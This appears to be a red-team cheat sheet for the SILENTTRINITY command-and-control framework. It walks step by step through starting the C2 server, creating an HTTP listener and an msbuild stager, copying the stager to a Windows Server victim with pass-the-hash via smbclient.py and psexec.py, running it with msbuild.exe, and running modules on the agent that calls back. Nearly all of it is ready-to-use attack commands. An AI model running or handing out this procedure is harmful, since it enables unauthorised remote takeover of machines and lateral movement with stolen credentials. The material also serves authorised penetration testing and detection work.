## SILENTTRINITY

https://github.com/byt3bl33d3r/SILENTTRINITY


### Basic usage #1

**Attacker**:

* Ubuntu 16.04.6 LTS
* SILENTTRINITY version 0.1.0dev
* python version 3.7

**Victim**:

* Windows server 2012 r2


#### Download and run SILENTTRINITY

```
git clone https://github.com/byt3bl33d3r/SILENTTRINITY
cd SILENTTRINITY/
./st.py
```

#### Launch listeners and generate a stager for this listener

```
listeners
use http
set Port 3281
start

stagers
use msbuild
generate http

[+] Generated stager to msbuild.xml
[*] Launch with 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe msbuild.xml'
```

#### execute the stager

```
smbclient.py -hashes :f56a839599f1be0401281dd9623c29 "CONTOSO/adminjd:@192.168.0.1"
use C$
cd windows/temp
put msbuild.xml
```

```
psexec.py -hashes :f56a839599f1be0401281dd9623c29 "CONTOSO/adminjd:@192.168.0.1"
cd ../temp
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe msbuild.xml
```

#### run modules

An agent should appear in SILENTTRINITY console.


```
sessions
list

modules
use ipy/systeminfo
run 86d80152-6152-4b8b-9b91-bb1c60440238
```



